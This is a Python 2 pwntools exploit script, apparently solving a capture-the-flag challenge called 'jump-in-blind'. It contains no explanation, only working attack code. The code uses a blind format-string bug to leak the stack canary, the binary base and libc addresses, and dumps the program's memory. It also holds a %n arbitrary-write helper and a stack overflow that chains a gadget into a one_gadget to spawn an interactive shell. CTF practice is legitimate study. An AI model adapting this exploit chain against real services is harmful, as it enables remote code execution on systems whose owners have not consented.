#!/usr/bin/python2

from pwn import *
import sys

r = remote('jump-in-blind.hack.fe-ctf.dk', 1337)
to_place_sh = 0x24fa
context.bits = 64
printf_off = 0x3fc0
set_up = 0x000000000008f34f #: xor eax, eax ; pop r12 ; pop r13 ; ret

def locate_base():
	count = 0
	leak = ''
	canary = ''
	while True:
		payload = "%{}$p".format(22+count)
		r.sendlineafter('>>', payload)
		leak = r.recvline().strip()
		#print leak[-3:]
		if leak[-3:] == '120':
			payload = "%{}$p".format(22+count-1)
			r.sendlineafter('>>', payload)
			canary = r.recvline().strip()
			break
		count += 1
	leak = int(leak[2:], 16)
	canary = int(canary[2:], 16)
	return leak, canary

def leak_source(addr):
	pad = '%7$s.tmp{}'.format(p64(addr))
	r.sendlineafter('>>', pad)
	chef = r.recvuntil('.tmp', drop=True)
	chef = chef[1:]
	if not chef:
		chef = '\x00'
	return chef

def extract(base_addr):
	dump = ""
	count = 0
	try:
		while True:
			res = leak_source(base_addr+count)
			log.info('Offset: {}; Leak: {}\n\n'.format(hex(base_addr+count), res))
			count += len(res)
			dump = dump + res			
	except Exception as e:
		log.info('Something went wrong')
		log.info('this dump is size {}'.format(len(dump)))
		print e
	log.info("Completed!, Dump size is {}".format(len(dump)))
	f = open("blind_kekw", "ab")
	f.write(dump)
	f.close()

def leaking_libc_pog(base_addr):
	leaks = []
	plt = base_addr + 0x3fa0 
	for i in range(26):
		leak = leak_source(plt + i*8)
		if leak:
			chef = u64(leak.ljust(8,"\x00"))
			leaks.append((hex(plt + i*8),chef))
	for l in leaks:
		print '{}: {}'.format(l[0],hex(l[1]))
	return leaks[4]

def write(write_addr, value):
	payload = '%{}x%7$n{}'.format(value, p64(write_addr))
	r.sendlineafter('>>',payload)
	return

def locate_canary():
	count = 0
	canary = ''
	while True:
		payload = "%{}$p".format(8+count)
		r.sendlineafter('>>', payload)
		leak = r.recvline().strip()
		print leak
		if len(leak) >=17:
			canary = leak
			break
		count += 1
	return int(canary[2:], 16), count +2

def run():
	r.sendlineafter('>>', '%2$p')
	check = int(r.recvline().strip()[2:], 16)
	if check < 0x80:
		log.error('buffer to small, size {}'.format(hex(check)))
	log.info('buffer is adequate, size {}'.format(hex(check)))
	leak, canary = locate_base()
	canary, offset = locate_canary()
	leak = leak - 0x1120
	log.info("Base Found: {}".format(hex(leak)))
	log.info("Canary: {}".format(hex(canary)))
	log.info("buffer space: {}".format(hex(offset*8)))
	check = leak_source(leak)
	print check
	printf = leak_source(leak + 0x3fc0) 
	printf = u64(printf.ljust(8,"\x00"))
	libc = printf - 0x56cf0
	log.info('libc: {}'.format(hex(libc)))
	one_gadget = libc + 0xcbd1a
	payload = "A" * offset*8 + p64(canary) + p64(0)
	payload += p64(libc+set_up) + p64(0) + p64(0) + p64(one_gadget)
	r.sendlineafter('>>',payload)
	r.interactive()


def main():
	global r
	while True:
		try:
			run()
		except:
			print "failure"
			r.close()
			r = remote('jump-in-blind.hack.fe-ctf.dk', 1337)

if __name__ == '__main__':
	main()


"""
0x563142d91fa0: 0x7f42f09d65f0 puts
0x563142d91fa8: 0x7f42f0a4ef20 write
0x563142d91fb0: 0x7f42f0abfb60 
0x563142d91fb8: 0x7f42f0a6d6f0 __stack_chk_fail
0x563142d91fc0: 0x7f42f09b6cf0 printf
0x563142d91fc8: 0x7f42f0a4ee80 read
0x563142d91fd0: 0x7f42f09d6cd0 
0x563142d91fd8: 0x0
0x563142d91fe0: 0x7f42f0986c20 __libc_start_main
0x563142d91fe8: 0x0
0x563142d91ff0: 0x0
0x563142d91ff8: 0x0
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
"""